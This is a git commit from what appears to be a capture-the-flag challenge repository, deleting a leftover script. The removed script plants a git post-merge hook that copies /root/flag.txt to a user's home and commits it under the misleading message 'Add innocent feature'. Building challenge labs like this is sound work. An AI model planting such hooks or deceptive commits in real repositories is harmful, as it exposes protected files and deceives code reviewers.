9f12c2179487fcbe75b70d313356c23203601567
Coops <147366361+dcooper94@users.noreply.github.com>
2025-06-19 16:42:19 +1000

    Delete devmachine01/scripts/inject_hook.sh
    Left over from previous version of the challenge

--- devmachine01/scripts/inject_hook.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-echo '#!/bin/bash' > .git/hooks/post-merge
-echo 'cp /root/flag.txt /home/devuser/flag.txt' >> .git/hooks/post-merge
-chmod +x .git/hooks/post-merge
-git commit -am "Add innocent feature"
-git push
